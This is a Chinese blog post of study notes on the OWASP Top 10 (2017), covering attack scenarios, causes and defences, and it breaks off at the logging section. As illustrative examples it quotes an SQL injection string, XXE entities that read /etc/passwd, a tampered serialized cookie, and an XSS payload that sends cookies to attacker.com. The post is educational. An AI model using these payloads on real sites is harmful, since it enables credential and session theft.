<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="努力，奋斗！"><title>OWASPTop2017笔记 | 其斤.匕禾页</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">OWASPTop2017笔记</h1><a id="logo" href="/.">其斤.匕禾页</a><p class="description">站在巨人的肩膀上，做只勤奋的小蜜蜂！</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/2018/10/02/lnmp技术栈文章汇总/"><i class="fa fa-archive"> LNMP技术栈</i></a><a href="/2018/10/02/速读laravel源码/"><i class="fa fa-archive"> laravel框架学习</i></a><a href="https://zhimap.com/mmap/773f7025d57f4c24b3c680bd9972c7e8"><i class="fa fa-archive"> 秒杀系统学习</i></a><a href="/2018/11/01/nosql学习汇总/"><i class="fa fa-archive"> nosql</i></a><a href="/2018/09/22/408基础/"><i class="fa fa-archive"> 计算机基础</i></a><a href="/2018/09/17/resume/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">OWASPTop2017笔记</h1><div class="post-meta">Jan 31, 2018<span> | </span><span class="category"><a href="/categories/web安全/">web安全</a></span></div><a class="ds-thread-count" href="/2018/01/31/OWASPTop2017笔记/#SOHUCS"><span id="changyan_count_unit" style="font-size: 15px; color: #6E7173;">0</span><span> 条评论</span></a><script src="https://assets.changyan.sohu.com/upload/plugins/plugins.count.js" async></script><div class="post-content"><p>可能第一次接触web安全的同学，都不知道标题是什么意思，现在先扫盲一下<br><a id="more"></a></p>
<h2 id="关于OWASP"><a href="#关于OWASP" class="headerlink" title="关于OWASP"></a>关于OWASP</h2><blockquote>
<p>OWASP，全称是：Open Web Application Security Project，翻译为中文就是：开放式Web应用程序安全项目，是一个非营利组织，不附属于任何企业或财团，这也是该组织可以不受商业控制地进行安全开发及安全普及的重要原因。</p>
</blockquote>
<h2 id="关于OWASP-TOP-10"><a href="#关于OWASP-TOP-10" class="headerlink" title="关于OWASP TOP 10"></a>关于OWASP TOP 10</h2><blockquote>
<p>这是每年的一份关于web应用的十大威胁安全报告，会在经过安全专家的测验之后确定十大类对当前web应用威胁最大和被应用最广的漏洞，同时也会对其进行详细的分析威胁所在。 </p>
</blockquote>
<h2 id="历史版本"><a href="#历史版本" class="headerlink" title="历史版本"></a>历史版本</h2><h3 id="OWASP-Top-10-2010"><a href="#OWASP-Top-10-2010" class="headerlink" title="OWASP Top 10 - 2010"></a>OWASP Top 10 - 2010</h3><blockquote>
<p>A1—注入<br> A2—跨站脚本、XSS<br> A3—失效的身份认证会话管理<br> A4—不安全的直接对象引用<br> A5—跨站请求伪造(CSRF)<br> A6—安全配置错误<br> A7—不安全的加密存储<br> A8—没有限制的URL访问<br> A9—传输层保护不足<br> A10—未验证的重定向和转发</p>
</blockquote>
<h3 id="OWASP-Top-10-2013"><a href="#OWASP-Top-10-2013" class="headerlink" title="OWASP Top 10 - 2013"></a>OWASP Top 10 - 2013</h3><blockquote>
<p>A1—注入<br> A2—失效的身份认证会话管理<br> A3—跨站脚本、XSS<br> A4—不安全的直接对象引用<br> A5—安全配置错误<br> A6—敏感信息泄漏<br> A7—功能级访问控制缺失<br> A8—跨站请求伪造(CSRF)<br> A9—使用含有已知漏洞的组件<br> A10—未验证的重定向和转发  </p>
</blockquote>
<h3 id="OWASP-Top-10-2017"><a href="#OWASP-Top-10-2017" class="headerlink" title="OWASP Top 10 - 2017"></a>OWASP Top 10 - 2017</h3><blockquote>
<p>A1—注入<br> A2—失效的身份认证会话管理<br> A3—敏感信息泄露<br> A4—XML外部实体<br> A5—失效的访问控制<br> A6—安全配置错误<br> A7—跨站脚本（XSS）<br> A8—不安全的反序列化<br> A9—使用含有已知漏洞的组件<br> A10—不足的日志记录和监控         </p>
</blockquote>
<h1 id="OWASP-Top-10-2017-1"><a href="#OWASP-Top-10-2017-1" class="headerlink" title="OWASP Top 10 - 2017"></a>OWASP Top 10 - 2017</h1><h2 id="1注入"><a href="#1注入" class="headerlink" title="1注入"></a>1注入</h2><h3 id="攻击案例场景"><a href="#攻击案例场景" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><h4 id="场景-1"><a href="#场景-1" class="headerlink" title="场景#1"></a>场景#1</h4><p>应用程序在下面存在脆弱性的SQL语句的构造中使用不可信数据：<br>String query = “SELECT * FROM accounts WHERE<br>custID=’” + request.getParameter(“id”) + “‘“;</p>
<h4 id="场景-2"><a href="#场景-2" class="headerlink" title="场景#2"></a>场景#2</h4><p>同样的，框架应用的盲目信任，仍然可能导致查询语句<br>的漏洞。（例如：Hibernate查询语言（HQL））：<br>Query HQLQuery = session.createQuery(“FROM accounts<br>WHERE custID=’” + request.getParameter(“id”) + “‘“);<br>在这两个案例中，攻击者在浏览器中将“id”参数的值修改成： ’<br>or’1’=’1。例如：<a href="http://example.com/app/accountView?id=&#39;" target="_blank" rel="noopener">http://example.com/app/accountView?id=&#39;</a> or ‘1’=’1<br>这样查询语句的意义就变成了从accounts表中返回所有的记录。<br>更危险的攻击可能导致数据被篡改甚至是存储过程被调用。</p>
<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>用户提供的数据没有经过应用程序的验证、过滤或净化。</li>
<li>动态查询语句或非参数化的调用，在没有上下文感知转义的情况<br>下，被用于解释器。</li>
<li>在ORM搜索参数中使用了恶意数据，这样搜索就获得包含敏感<br>或未授权的数据。</li>
<li>恶意数据直接被使用或连接，诸如SQL语句或命令在动态查询语<br>句、命令或存储过程中包含结构和恶意数据。</li>
</ul>
<h3 id="防止"><a href="#防止" class="headerlink" title="防止"></a>防止</h3><ul>
<li>最佳选择是使用安全的API，完全避免使用解释器，或提供参数<br>化界面的接口，或迁移到ORM或实体框架。</li>
<li>注意：当参数化时，存储过程仍然可以引入SQL注入，如果<br>PL/SQL或T-SQL将查询和数据连接在一起，或者执行带有立即<br>执行或exec()的恶意数据。</li>
<li>使用正确的或“白名单”的具有恰当规范化的输入验证方法同样<br>会有助于防止注入攻击，但这不是一个完整的防御，因为许多应<br>用程序在输入中需要特殊字符，例如文本区域或移动应用程序的<br>API。</li>
<li>对于任何剩余的动态查询，可以使用该解释器的特定转义语法转<br>义特殊字符。OWASP的Java Encoder和类似的库提供了这样的<br>转义例程。</li>
<li>注意：SQL结构，比如：表名、列名等无法转义，因此用户提供<br>的结构名是非常危险的。这是编写软件中的一个常见问题。</li>
<li>在查询中使用LIMIT和其他SQL控件，以防止在SQL注入时大量<br>地泄露记录。</li>
</ul>
<h2 id="2失效的身份认证"><a href="#2失效的身份认证" class="headerlink" title="2失效的身份认证"></a>2失效的身份认证</h2><h3 id="攻击案例场景-1"><a href="#攻击案例场景-1" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><h4 id="场景-1-1"><a href="#场景-1-1" class="headerlink" title="场景#1"></a>场景#1</h4><p>凭证填充，使用已知密码的列表，是常见的攻击。如果<br>应用程序不限制身份验证尝试，则可以将应用程序用作密码oracle，<br>以确定凭证是否有效。</p>
<h4 id="场景-2-1"><a href="#场景-2-1" class="headerlink" title="场景#2"></a>场景#2</h4><p>大多数身份验证攻击都是由于使用密码作为唯一的因素。<br>依据最佳实践，最新的密码轮换和复杂性要求鼓励用户使用、重<br>用以及重用弱密码。建议组织在NIST-800-63中停止这些实践，并<br>使用多因素身份验证。</p>
<h4 id="场景-3"><a href="#场景-3" class="headerlink" title="场景#3"></a>场景#3</h4><p>应用会话超时设置不正确。用户使用公共计算机访问应<br>用程序。用户直接关闭浏览器选项卡就离开，而不是选择“注<br>销”。攻击者一小时后使用同一个浏览器浏览网页，而当前用户<br>状态仍然是经过身份验证的。</p>
<h3 id="产生原因-1"><a href="#产生原因-1" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>允许凭证填充，这使得攻击者获得有效用户名和密码的列表。</li>
<li>允许暴力破解或其他自动攻击。</li>
<li>允许默认的、弱的或众所周知的密码，例如“Password1”或<br>“admin/admin”。</li>
<li>使用弱的或失效的验证凭证，忘记密码程序，例如“基于知识的<br>答案”，这是不安全的。</li>
<li>使用明文、加密或弱散列密码（参见：A3:2017-敏感数据泄露）。</li>
<li>缺少或失效的多因素身份验证。</li>
<li>暴露URL中的会话ID（例如URL重写）。</li>
<li>在成功登录后不会更新会话ID。</li>
<li>不正确地使会话ID失效。当用户不活跃的时候，用户会话或认证<br>令牌（特别是单点登录（SSO）令牌）没有正确注销或失效。</li>
</ul>
<h3 id="防止-1"><a href="#防止-1" class="headerlink" title="防止"></a>防止</h3><ul>
<li>在可能的情况下，实现多因素身份验证，以防止自动、凭证填充、<br>暴力破解和被盗凭据再利用攻击。</li>
<li>不要使用发送或部署默认的凭证，特别是管理员用户。</li>
<li>执行弱密码检查，例如测试新或变更的密码，以纠正“排名前<br>10000个弱密码” 列表。</li>
<li>将密码长度、复杂性和循环策略与NIST-800-63 B的指导方针的<br>5.1.1章节-记住秘密，或其他现代的基于证据的密码策略相一致。</li>
<li>确认注册、凭据恢复和API路径，通过对所有输出结果使用相同<br>的消息，用以抵御账户枚举攻击。</li>
<li>限制或逐渐延迟失败的登录尝试。记录所有失败信息并在凭据填<br>充、暴力破解或其他攻击被检测时提醒管理员。</li>
<li>使用服务器端安全的内置会话管理器，在登录后生成高度复杂的<br>新随机会话ID。会话ID不能在URL中，可以安全地存储和当登出、<br>闲置、绝对超时后使其失效</li>
</ul>
<h2 id="3敏感信息泄露"><a href="#3敏感信息泄露" class="headerlink" title="3敏感信息泄露"></a>3敏感信息泄露</h2><h3 id="攻击案例场景-2"><a href="#攻击案例场景-2" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><h4 id="场景-1-2"><a href="#场景-1-2" class="headerlink" title="场景 #1"></a>场景 #1</h4><p>一个应用程序使用自动化的数据加密系统加密信用卡信<br>息，并存储在数据库中。但是，当数据被检索时被自动解密，这<br>就使得SQL注入漏洞能够以明文形式获得所有信用卡卡号。</p>
<h4 id="场景-2-2"><a href="#场景-2-2" class="headerlink" title="场景 #2"></a>场景 #2</h4><p>一个网站上对所有网页没有使用或强制使用TLS，或者使<br>用弱加密。攻击者通过监测网络流量（如：不安全的无线网络），<br>将网络连接从HTTPS降级到HTTP，就可以截取请求并窃取用户会话<br>cookie。 之后，攻击者可以复制用户cookie并成功劫持经过认证<br>的用户会话、访问或修改用户个人信息。除此之外，攻击者还可<br>以更改所有传输过程中的数据，例如：转款的接接收者。</p>
<h4 id="场景-3-1"><a href="#场景-3-1" class="headerlink" title="场景 #3"></a>场景 #3</h4><p>密码数据库使用未加盐的哈希算法或弱哈希算法去存储<br>每个人的密码。一个文件上传漏洞使黑客能够获取密码文件。所<br>有这些未加盐哈希的密码通过彩虹表暴力破解方式破解。 由简单<br>或快速散列函数生成加盐的哈希，也可以通过GPU破解。</p>
<h3 id="产生原因-2"><a href="#产生原因-2" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>在数据传输过程中是否使用明文传输？这和传输协议相关，如：<br>HTTP、SMTP和FTP。外部网络流量非常危险。验证所有的内部通<br>信，如：负载平衡器、Web服务器或后端系统之间的通信。</li>
<li>当数据被长期存储时，无论存储在哪里，它们是否都被加密，包<br>含备份数据？</li>
<li>无论默认条件还是源代码中，是否还在使用任何旧的或脆弱的加<br>密算法？</li>
<li>是否使用默认加密密钥，生成或重复使用脆弱的加密密钥，或者<br>缺少恰当的密钥管理或密钥回转？</li>
<li>是否强制加密敏感数据，例如：用户代理（如：浏览器）指令和<br>传输协议是否被加密？</li>
<li>用户代理（如：应用程序、邮件客户端）是否未验证服务器端证<br>书的有效性？</li>
</ul>
<h3 id="防止-2"><a href="#防止-2" class="headerlink" title="防止"></a>防止</h3><ul>
<li>对系统处理、存储或传输的数据分类，并根据分类进行访问控制。</li>
<li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保<br>护敏感数据。</li>
<li>对于没必要存放的、重要的敏感数据，应当尽快清除，或者通过<br>PCI DSS标记或拦截。未存储的数据不能被窃取。</li>
<li>确保存储的所有敏感数据被加密。</li>
<li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，<br>并且密钥管理到位。</li>
<li>确保传输过程中的数据被加密，如：使用TLC。确保数据加密被<br>强制执行，如：使用HTTP严格安全传输协议（HSTS ）。</li>
<li>禁止缓存对包含敏感数据的响应。</li>
<li>确保使用密码专用算法存储密码，如：Argon2 、 scrypt 、<br>bcrypt 或者PBKDF2 。将工作因素（延迟因素）设置在可接受<br>范围。</li>
<li>单独验证每个安全配置项的有效性。</li>
</ul>
<h2 id="4XML-外部实体（XXE）"><a href="#4XML-外部实体（XXE）" class="headerlink" title="4XML 外部实体（XXE）"></a>4XML 外部实体（XXE）</h2><h3 id="攻击案例场景-3"><a href="#攻击案例场景-3" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
<li>场景 #1<br>攻击者尝试从服务端提取数据：<br>&lt;?xml version=”1.0” encoding=”ISO-8859-1”?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM “file:///etc/passwd” &gt;]&gt;<foo>&xxe;</foo></li>
<li>场景 #2<br>攻击者通过将上面的实体行更改为以下内容来探测服务<br>器的专用网络：<br>&lt;!ENTITY xxe SYSTEM “<a href="https://192.168.1.1/private&quot;" target="_blank" rel="noopener">https://192.168.1.1/private&quot;</a> &gt;]&gt;</li>
<li>场景 #3<br>攻击者通过恶意文件执行拒绝服务攻击：<br>&lt;!ENTITY xxe SYSTEM “file:///dev/random” &gt;]&gt;<h3 id="产生原因-3"><a href="#产生原因-3" class="headerlink" title="产生原因"></a>产生原因</h3></li>
<li>您的应用程序直接接受XML文件或者接受XML文件上传，特别是<br>来自不受信任源的文件，或者将不受信任的数据插入XML文件，<br>并提交给XML处理器解析。</li>
<li>在应用程序或基于Web服务的SOAP中，所有XML处理器都启用<br>了文档类型定义（DTDs）。因为禁用DTD进程的确切机制因处<br>理器而不同，更多资料请参考：《OWASP Cheat Sheet ‘XXE<br>Prevention‘ 》。</li>
<li>如果为了实现安全性或单点登录（SSO），您的应用程序使用<br>SAML进行身份认证。而SAML使用XML进行身份确认，那么您<br>的应用程序就容易受到XXE攻击。</li>
<li>如果您的应用程序使用第1.2版之前的SOAP，并将XML实体传<br>递到SOAP框架，那么它可能受到XXE攻击。</li>
<li>存在XXE缺陷的应用程序更容易受到拒绝服务攻击，包括：<br>Billion Laughs 攻击</li>
</ul>
<h3 id="防止-3"><a href="#防止-3" class="headerlink" title="防止"></a>防止</h3><ul>
<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进<br>行序列化。</li>
<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器<br>和库。同时，通过依赖项检测，将SOAP更新到1.2版本或更高<br>版本。</li>
<li>参考《 OWASP Cheat Sheet ‘XXE Prevention‘ 》，在应用程序<br>的所有XML解析器中禁用XML外部实体和DTD进程。</li>
<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，<br>以防止在XML文档、标题或节点中出现恶意数据。</li>
<li>验证XML或XSL文件上传功能是否使用XSD验证或其他类似验证<br>方法来验证上传的XML文件。</li>
<li>尽管在许多集成环境中，手动代码审查是大型、复杂应用程序的<br>最佳选择，但是SAST 工具可以检测源代码中的XXE漏洞</li>
</ul>
<h2 id="5失效的访问控制"><a href="#5失效的访问控制" class="headerlink" title="5失效的访问控制"></a>5失效的访问控制</h2><h3 id="攻击案例场景-4"><a href="#攻击案例场景-4" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
<li>场景 #1<br>应用程序在访问帐户信息的 SQL调用中使用了未经验证<br>的数据：<br>pstmt.setString(1，request.getParameter(“acct”));<br>ResultSet results = pstmt.executeQuery( );<br>攻击者只需修改浏览器中的“acct”参数即可发送他们想要的任何<br>帐号信息。如果没有正确验证，攻击者可以访问任何用户的帐户。<br><a href="http://example.com/app/accountInfo?acct=notmyacct" target="_blank" rel="noopener">http://example.com/app/accountInfo?acct=notmyacct</a></li>
<li>场景 #2<br>攻击者仅强制浏览目标URL。管理员权限是访问管理页<br>面所必需的。<br><a href="http://example.com/app/getappInfo" target="_blank" rel="noopener">http://example.com/app/getappInfo</a><br><a href="http://example.com/app/admin_getappInfo" target="_blank" rel="noopener">http://example.com/app/admin_getappInfo</a><br>如果一个未经身份验证的用户可以访问任何页面，那么这是一个<br>缺陷。如果一个非管理员权限的用户可以访问管理页面，那么这<br>同样也是一个缺陷。</li>
</ul>
<h3 id="产生原因-4"><a href="#产生原因-4" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
<li>通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制<br>检查，或简单地使用自定义的 API 攻击工具。</li>
<li>允许将主键更改为其他用户的记录，例如查看或编辑他人的帐户。</li>
<li>特权提升。在不登录的情况下假扮用户，或以用户身份登录时充<br>当管理员。</li>
<li>元数据操作，如重放或篡改 JWT 访问控制令牌，或作以提升权<br>限的cookie 或隐藏字段。</li>
<li>CORS配置错误允许未授权的API访问。</li>
<li>以未通过身份验证的用户身份强制浏览的通过身份验证时才能看<br>到的页面、或作为标准用户访问具有相关权限的页面、或API没<br>有对POST、PUT和DELETE强制执行访问控制。<h3 id="防止-4"><a href="#防止-4" class="headerlink" title="防止"></a>防止</h3></li>
<li>除公有资源外，默认情况下拒绝访问。</li>
<li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，<br>包括最小化CORS使用。</li>
<li>建立访问控制模型以强制执行所有权记录，而不是接受用户创建、<br>读取、更新或删除的任何记录。</li>
<li>域访问控制对每个应用程序都是唯一的，但业务限制要求应由域<br>模型强制执行。</li>
<li>禁用 Web服务器目录列表，并确保文件元数据（如：git）不存<br>在于 Web的根目录中。</li>
<li>记录失败的访问控制，并在适当时向管理员告警（如：重复故<br>障）。</li>
<li>对API和控制器的访问进行速率限制，以最大限度地降低自动化<br>攻击工具的危害。</li>
<li>当用户注销后，服务器上的JWT令牌应失效</li>
</ul>
<h2 id="6安全配置错误"><a href="#6安全配置错误" class="headerlink" title="6安全配置错误"></a>6安全配置错误</h2><h3 id="攻击案例场景-5"><a href="#攻击案例场景-5" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
<li>场景#1：<br>应用程序服务器附带了未从产品服务器中删除的应用程<br>序样例。这些样例应用程序具有已知的安全漏洞，攻击者利用这<br>些漏洞来攻击服务器。如果其中一个应用程序是管理员控制台，<br>并且没有更改默认账户，攻击者就可以通过默认密码登录，从而<br>接管服务器。</li>
<li>场景#2：<br>目录列表在服务器端未被禁用。攻击者发现他们很容易<br>就能列出目录列表。攻击者找到并下载所有已编译的Java类，他<br>们通过反编译来查看代码。然后，攻击者在应用程序中找到一个<br>严重的访问控制漏洞。</li>
<li>场景#3：<br>应用服务器配置允许将详细的错误信（如：堆栈跟踪信<br>息）返回给用户，这可能会暴露敏感信息或潜在的漏洞，如：已<br>知含有漏洞的组件的版本信息。</li>
<li>场景#4：<br>云服务向其他CSP用户提供默认的网络共享权限。这允<br>许攻击者访问存储在云端的敏感数据。<h3 id="产生原因-5"><a href="#产生原因-5" class="headerlink" title="产生原因"></a>产生原因</h3></li>
<li>应用程序栈堆的任何部分都缺少适当的安全加固，或者云服务的<br>权限配置错误。</li>
<li>应用程序启用或安装了不必要的功能（例如：不必要的端口、服<br>务、网页、帐户或权限）。</li>
<li>默认帐户的密码仍然可用且没有更改。</li>
<li>错误处理机制向用户披露堆栈跟踪或其他大量错误信息。</li>
<li>对于更新的系统，禁用或不安全地配置最新的安全功能。</li>
<li>应用程序服务器、应用程序框架（如：Struts、Spring、<br>ASP.NET）、库文件、数据库等没有进行安全配置。</li>
<li>服务器不发送安全标头或指令，或者未对服务器进行安全配置。</li>
<li>您的应用软件已过期或易受攻击（参见A9：2017-使用含有已知<br>漏洞的组件）<h3 id="防止-5"><a href="#防止-5" class="headerlink" title="防止"></a>防止</h3></li>
<li>一个可以快速且易于部署在另一个锁定环境的可重复的加固过程。<br>开发、质量保证和生产环境都应该进行相同配置，并且，在每个<br>环境中使用不同的密码。这个过程应该是自动化的，以尽量减少<br>安装一个新安全环境的耗费。</li>
<li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档<br>和示例。移除或不安装不适用的功能和框架。</li>
<li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并<br>将其作为更新管理过程的一部分，（参见A9：2017-使用含有已<br>知漏洞的组件）。在检查过程中，应特别注意云存储权限（如：<br>S3桶权限）。</li>
<li>一个能在组件和用户间提供有效的分离和安全性的分段应用程<br>序架构，包括：分段、容器化和云安全组。</li>
<li>向客户端发送安全指令，如：安全标头。</li>
<li>在所有环境中能够进行正确安全配置和设置的自动化过程。</li>
</ul>
<h2 id="7跨站脚本（XSS）"><a href="#7跨站脚本（XSS）" class="headerlink" title="7跨站脚本（XSS）"></a>7跨站脚本（XSS）</h2><h3 id="攻击案例场景-6"><a href="#攻击案例场景-6" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
<li>场景#1<br>应用程序在下面HTML代码段的构造中使用未经验证或转<br>义的不可信的数据：<br>(String) page += “&lt;input name=’creditcard’ type=’TEXT‘<br>value=’” + request.getParameter(“CC“) + “‘&gt;”;<br>攻击者在浏览器中修改“CC” 参数为如下值：<br>‘&gt;<script>document.location=<br>‘<a href="http://www.attacker.com/cgi-bin/cookie.cgi">http://www.attacker.com/cgi-bin/cookie.cgi</a>?<br>foo=’+document.cookie</script>‘.<br>这个攻击导致受害者的会话ID被发送到攻击者的网站，使得攻击<br>者能够劫持用户当前会话。<h3 id="产生原因-6"><a href="#产生原因-6" class="headerlink" title="产生原因"></a>产生原因</h3></li>
<li>反射式XSS：应用程序或API包括未经验证和未经转义的用户输入，<br>作为HTML输出的一部分。一个成功的攻击可以让攻击者在受害者<br>的浏览器中执行任意的HTML和JavaScript。 通常，用户将需要与指<br>向攻击者控制页面的某些恶意链接进行交互，例如恶意漏洞网站，<br>广告或类似内容。</li>
<li>存储式XSS：你的应用或者API将未净化的用户输入存储下来了，<br>并在后期在其他用户或者管理员的页面展示出来。 存储型XSS一<br>般被认为是高危或严重的风险。</li>
<li>基于DOM的XSS：会动态的将攻击者可控的内容加入页面的<br>JavaScript框架、单页面程序或API存在这种类型的漏洞。理想的<br>来说，你应该避免将攻击者可控的数据发送给不安全的JavaScript<br>API。<br>典型的XSS攻击可导致盗取session、账户、绕过MFA、DIV替换、<br>对用户浏览器的攻击（例如：恶意软件下载、键盘记录）以及其<br>他用户侧的攻击。<h3 id="防止-6"><a href="#防止-6" class="headerlink" title="防止"></a>防止</h3></li>
<li>使用设计上就会自动编码来解决XSS问题的框架，如：Ruby 3.0<br>或 React JS。了解每个框架的XSS保护的局限性，并适当地处<br>理未覆盖的用例。</li>
<li>为了避免反射式或存储式的XSS漏洞，最好的办法是根据HTML<br>输出的上下文（包括：主体、属性、JavaScript、CSS或URL）<br>对所有不可信的HTTP请求数据进行恰当的转义 。更多关于数据<br>转义技术的信息见：《OWASP Cheat Sheet ‘XSS Prevention’》<br>。</li>
<li>在客户端修改浏览器文档时，为了避免DOM XSS攻击，最好的<br>选择是实施上下文敏感数据编码。如果这种情况不能避免，可以<br>采用《OWASP Cheat Sheet ‘DOM based XSS Prevention ‘》<br>描述的类似上下文敏感的转义技术应用于浏览器API。</li>
<li>使用内容安全策略（CSP）是对抗XSS的深度防御策略。如果<br>不存在可以通过本地文件放置恶意代码的其他漏洞（例如：路径<br>遍历覆盖和允许在网络中传输的易受攻击的库），则该策略是有<br>效的。</li>
</ul>
<h2 id="8不安全的反序列化"><a href="#8不安全的反序列化" class="headerlink" title="8不安全的反序列化"></a>8不安全的反序列化</h2><h3 id="攻击案例场景-7"><a href="#攻击案例场景-7" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
<li>场景 #1<br>一个React应用程序调用了一组Spring Boot微服务。作<br>为功能性程序员，他们试图确保他们的代码是不可变的。他们提<br>出的解决方法是序列化用户状态，并在每次请求时来回传递。攻<br>击者注意到了“R00”Java对象签名，并使用Java Serial Killer工<br>具在应用服务器上获得远程代码执行。</li>
<li>场景 #2<br>一个PHP论坛使用PHP对象序列化来保存一个“超<br>级”cookie。该cookie包含了用户的用户ID、角色、密码哈希和其<br>他状态：<br>a:4:{i:0;i:132;i:1;s:7:”Mallory”;i:2;s:4:”user”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<br>攻击者更改序列化对象以授予自己为admin权限：<br>a:4:{i:0;i:1;i:1;s:5:”Alice”;i:2;s:5:”admin”;<br>i:3;s:32:”b6a8b3bea87fe0e05022f8f3c88bc960”;}<h3 id="产生原因-7"><a href="#产生原因-7" class="headerlink" title="产生原因"></a>产生原因</h3></li>
<li>如果应用中存在可以在反序列化过程中或者之后被改变行为的类，<br>则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击。我<br>们将其称为对象和数据结构攻击。</li>
<li>典型的数据篡改攻击，如访问控制相关的攻击，其中使用了现有<br>的数据结构，但内容发生了变化。<br>在应用程序中，序列化可能被用于:</li>
<li>远程和进程间通信（RPC / IPC）</li>
<li>连线协议、Web服务、消息代理</li>
<li>缓存/持久性</li>
<li>数据库、缓存服务器、文件系统</li>
<li>HTTP cookie、HTML表单参数、API身份验证令牌<h3 id="防止-7"><a href="#防止-7" class="headerlink" title="防止"></a>防止</h3></li>
<li>执行完整性检查，如：任何序列化对象的数字签名，以防止恶<br>意对象创建或数据篡改。</li>
<li>在创建对象之前强制执行严格的类型约束，因为代码通常被期<br>望成一组可定义的类。绕过这种技术的方法已经被证明，所以<br>完全依赖于它是不可取的。</li>
<li>如果可能，隔离运行那些在低特权环境中反序列化的代码。</li>
<li>记录反序列化的例外情况和失败信息，如：传入的类型不是预<br>期的类型，或者反序列处理引发的例外情况。</li>
<li>限制或监视来自于容器或服务器传入和传出的反序列化网络连<br>接。</li>
<li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li>
</ul>
<h2 id="9使用含有已知漏洞的组件"><a href="#9使用含有已知漏洞的组件" class="headerlink" title="9使用含有已知漏洞的组件"></a>9使用含有已知漏洞的组件</h2><h3 id="攻击案例场景-8"><a href="#攻击案例场景-8" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
<li>场景 #1<br>很多时候组件都是以与应用相同的权限运行的，这使得<br>组件里的缺陷可能导致各式各样的问题。这些缺陷可能是偶然的<br>（如：编码错误），也可能是蓄意的（如：组件里的后门）。下<br>面是一些已被利用的漏洞：<br>• CVE-2017-5638，一个Struts2远程执行漏洞。 可在服务端远程<br>执行代码，并已造成巨大的影响。<br>• 虽然物联网（IoT）设备一般难以通过打补丁来修复。但对之打<br>补丁非常重要（如：医疗设备）。<h3 id="产生原因-8"><a href="#产生原因-8" class="headerlink" title="产生原因"></a>产生原因</h3></li>
<li>如果你不知道所有使用的组件版本信息（包括：服务端和客户<br>端）。这包括了直接使用的组件或其依赖的组件。</li>
<li>如果软件易受攻击，不再支持或者过时。这包括：OS、Web服<br>务器、应用程序服务器、数据库管理系统（DBMS）、应用程序、<br>API和所有的组件、运行环境和库。</li>
<li>如果你不会定期做漏洞扫描和订阅你使用组件的安全公告。</li>
<li>如果你不基于风险并及时修复或升级底层平台、框架和依赖库。<br>很可能发生这种情况：根据变更控制，每月或每季度进行升级，<br>这使得组织在这段时间内会受到已修复但未修补的漏洞的威胁。</li>
<li>如果软件工程师没有对更新的、升级的或打过补丁的组件进行兼<br>容性测试。</li>
<li>如果你没有对组件进行安全配置（请参考“A6:2017-安全配置错<br>误”）。<h3 id="防止-8"><a href="#防止-8" class="headerlink" title="防止"></a>防止</h3></li>
<li>移除不使用的依赖、不需要的功能、组件、文件和文档。</li>
<li>利用如 versions、DependencyCheck 、retire.js等工具来持续的<br>记录客户端和服务器端以及它们的依赖库的版本信息。持续监控<br>如CVE 和 NVD等是否发布已使用组件的漏洞信息，可以使用软<br>件分析工具来自动完成此功能。订阅关于使用组件安全漏洞的警<br>告邮件。</li>
<li>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡<br>改或加入恶意漏洞的风险</li>
<li>监控那些不再维护或者不发布安全补丁的库和组件。如果不能打<br>补丁，可以考虑部署虚拟补丁来监控、检测或保护</li>
</ul>
<h2 id="10不足的日志记录和监控"><a href="#10不足的日志记录和监控" class="headerlink" title="10不足的日志记录和监控"></a>10不足的日志记录和监控</h2><h3 id="攻击案例场景-9"><a href="#攻击案例场景-9" class="headerlink" title="攻击案例场景"></a>攻击案例场景</h3><ul>
